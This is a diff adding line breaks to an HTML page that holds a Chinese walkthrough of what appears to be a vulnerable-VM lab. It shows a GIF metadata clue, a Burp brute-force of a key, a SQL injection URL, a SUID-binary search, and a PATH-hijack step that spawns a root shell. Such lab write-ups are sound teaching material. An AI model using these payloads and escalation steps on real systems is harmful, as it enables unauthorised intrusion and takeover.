@@ -7547,7 +7547,7 @@
 <p><img alt="image.png" src="../img/N8y3fzUMPLLPQ2Ea/1597669544077-0d215018-3c7b-466c-b846-046aa19d0493-396738.png" /></p>
 <p>访问首页有个 gif 图片，下载下来用 exiftool 看一下会发现有个 comment</p>
 <p><img alt="image.png" src="../img/N8y3fzUMPLLPQ2Ea/1597670193970-6f69e286-3347-49f5-ac35-8e7569b8a966-839575.png" /></p>
-<p>访问一下 kzMb5nVYJw，要输 key，尝试用 burp 选了个 password 的字典爆破一下：
+<p>访问一下 kzMb5nVYJw，要输 key，尝试用 burp 选了个 password 的字典爆破一下：<br />
 elite</p>
 <p><img alt="image.png" src="../img/N8y3fzUMPLLPQ2Ea/1597671140312-1c84eed2-de15-441e-85cb-d623c2f5b232-984167.png" /></p>
 <p>访问之后发现：</p>
@@ -7556,7 +7556,7 @@ elite</p>
 <p><img alt="image.png" src="../img/N8y3fzUMPLLPQ2Ea/1597671385292-730b86ec-6114-4fbb-869b-4580d38b7d0c-850144.png" /></p>
 <p>然后...</p>
 <p><img alt="image.png" src="../img/N8y3fzUMPLLPQ2Ea/1597671482903-58e6265f-fc41-4d9f-b9ce-1088ba759ae7-143523.png" /></p>
-<p>一年没有手工注入了，还有点怀念
+<p>一年没有手工注入了，还有点怀念<br />
 http://192.168.149.195/kzMb5nVYJw/420search.php?usrtosearch="union select 1,2,3%23</p>
 <p><img alt="image.png" src="../img/N8y3fzUMPLLPQ2Ea/1597671605384-914d9ca6-9e4e-4fd2-b65c-3b4e4a84262b-756618.png" /></p>
 <p>你以为我接下来要手注？不，我已经忘了那些单词咋拼了Orz...</p>
@@ -7568,13 +7568,13 @@ http://192.168.149.195/kzMb5nVYJw/420search.php?usrtosearch="union select 1,2,3%
 <p>去访问一下 phpmyadmin，试了几个密码登不上</p>
 <p>然后对着 777 端口去连接 ssh，连上了</p>
 <p><img alt="image.png" src="../img/N8y3fzUMPLLPQ2Ea/1597672777910-01bd9e70-2999-438c-b0be-31ddcc291e0d-189296.png" /></p>
-<p>find 找一下带有 S 权限的
+<p>find 找一下带有 S 权限的<br />
 find / -user root -perm -4000 -print 2&gt;/dev/null</p>
 <p><img alt="image.png" src="../img/N8y3fzUMPLLPQ2Ea/1597672929567-ff95e97b-375e-4e82-b03e-5e599367e598-034623.png" /></p>
 <p>把那个 /var/www/backup/procwatch 给拷贝下来</p>
-<p>echo '/bin/sh' &gt; ps
-chmod +x ps
-PATH=/var/www/backup
+<p>echo '/bin/sh' &gt; ps<br />
+chmod +x ps<br />
+PATH=/var/www/backup<br />
 ./procwatch</p>
 <p>然后就拿到了 root 权限，但是因为环境变量改了，所以没法直接用 ls，可以 /bin/ls</p>
 <p><img alt="image.png" src="../img/N8y3fzUMPLLPQ2Ea/1597674749956-e31a86f0-5fe1-4109-a4a5-785e16a85e52-921359.png" /></p>
